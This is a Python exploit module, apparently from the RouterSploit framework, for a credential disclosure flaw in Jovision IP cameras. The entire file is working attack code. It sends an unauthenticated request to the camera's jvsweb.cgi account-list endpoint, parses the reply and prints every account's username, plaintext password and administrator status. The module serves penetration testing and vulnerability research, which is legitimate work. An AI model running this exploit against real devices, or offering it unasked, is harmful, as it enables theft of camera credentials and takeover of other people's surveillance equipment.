import re
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient
import json


class Exploit(HTTPClient):
    __info__ = {
        "name": "Jovision camera credential disclosure",
        "description": "Exploit implementation for jovision IP camera Credential Disclosure vulnerability. "
                       "If target is vulnerable details of user accounts on the device including usernames and passwords are returned.",
        "authors": (
            "aborche",  # vulnerability discovery
            "casept",  # routersploit module
        ),
        "references": (
            "https://habr.com/ru/post/318572/",  # Original post in Russian
            "https://weekly-geekly.github.io/articles/318572/index.html"  # English translation
        ),
        "devices": (
            "JVS-N63-DY"
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        if self.check():
            print_success("Target seems to be vulnerable")

            response = self.http_request(
                method="GET",
                path="/cgi-bin/jvsweb.cgi?cmd=account&action=list"
            )
            if response is None:
                print_error("Exploit failed - connection error")
                return

            # The camera returns a JSON document with accounts, parse it
            j_resp = json.loads(response.text)

            # Some cameras have multiple accounts configured, list all of them
            accounts = list()
            for acc in j_resp:
                account = list()
                account.append(acc.get("acDescript"))  # Account description
                account.append(acc.get("acID"))  # Account username
                account.append(acc.get("acPW"))  # Acccount password
                # There seems to be some kind of permission level system for users
                # 20 seems to always be admin, normal users have <20
                if acc.get("nPower") >= 20:
                    account.append("Yes")
                else:
                    account.append("No")
                accounts.append(account)

            print_success("Accounts found:")
            print_table(("Description", "Username", "Password",
                         "Administrator"), *accounts)
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    @mute
    def check(self):
        response = self.http_request(
            method="GET",
            path="/cgi-bin/jvsweb.cgi?cmd=account&action=list"
        )

        if response is not None and response.status_code == 200:
            res = re.findall(".*acID.*", response.text)
            if len(res) > 0:
                return True

        return False
